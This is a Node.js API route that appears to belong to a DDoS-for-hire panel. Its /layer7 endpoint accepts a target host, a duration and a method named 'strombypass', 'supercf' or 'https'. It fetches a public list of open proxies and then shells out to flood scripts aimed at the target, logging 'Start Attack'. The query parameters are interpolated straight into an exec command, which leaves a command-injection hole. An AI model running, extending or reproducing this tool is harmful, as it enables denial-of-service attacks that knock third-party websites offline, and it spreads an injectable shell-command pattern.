const https = require("https");
const fs = require("fs");
exports.name = '/layer7';
exports.index = async (req, res, next) => {
  try {
    if (require('../API_KEY/data/check_api_key.js').check_api_key(req, res)) return;
    if (!req.query.host || !req.query.time || !req.query.method) return res.json({
      error: "Missing information",
      status: "0"
    })
    if (req.query.method == "strombypass") {
        GETPROXY();
        STROMBYPASS();
    }  else if (req.query.method == "supercf") {
        GETPROXY();
        SUPERCF();
    } else if (req.query.method == "https") {
        GETPROXY();
        HTTPS();
    } 
    else { 
        return res.json({
            error: "Method not found",
            status: "0"
        })
    }

    function STROMBYPASS() {
        var akea = require("child_process").exec;
        var command = `${"node method/layer7/STROM-BYPASS.js GET "}${req.query.host}${" http.txt "} ${req.query.time}${" 120 "} ${"3"}`;
        akea(command, (error, stdout, stderr) => { });
        console.log(`Start Attack: Method: STROM-BYPASS | Host: ${req.query.host} | Time: ${req.query.time}`);
        return res.json({
          status: "1",
          message: "Start Attack"
        })
    }

    function SUPERCF() {
        var akea = require("child_process").exec;
        var command = `${"node method/layer7/SUPERCF.js "}${req.query.host} ${req.query.time} 10 http.txt`;
        akea(command, (error, stdout, stderr) => { });
        console.log(`Start Attack: Method: SUPERCF | Host: ${req.query.host} | Time: ${req.query.time}`);
        return res.json({
            status: "1",
            message: "Start Attack"
        })
    }

    function HTTPS() {
       var akea = require("child_process").exec;
        var command = `${"node method/layer7/HTTPS.js GET "}${req.query.host} http.txt ${req.query.time} 120 3`;
        akea(command, (error, stdout, stderr) => { });
        console.log(`Start Attack: Method: HTTPS | Host: ${req.query.host} | Time: ${req.query.time}`);
        return res.json({
            status: "1",
            message: "Start Attack"
        })
    }

    function GETPROXY() {
        var requestproxy = "https://api.proxyscrape.com/v2/?request=getproxies&protocol=http&timeout=10000&country=all";
        const getfileproxy = fs.createWriteStream("http.txt");
        fs.writeFileSync("http.txt", " ");
        https.get(requestproxy, function (getproxy) {
        getproxy.pipe(getfileproxy);
    });
    }
  } catch (e) {
    return res.jsonp({ error: e, status: "0" });
  }
}
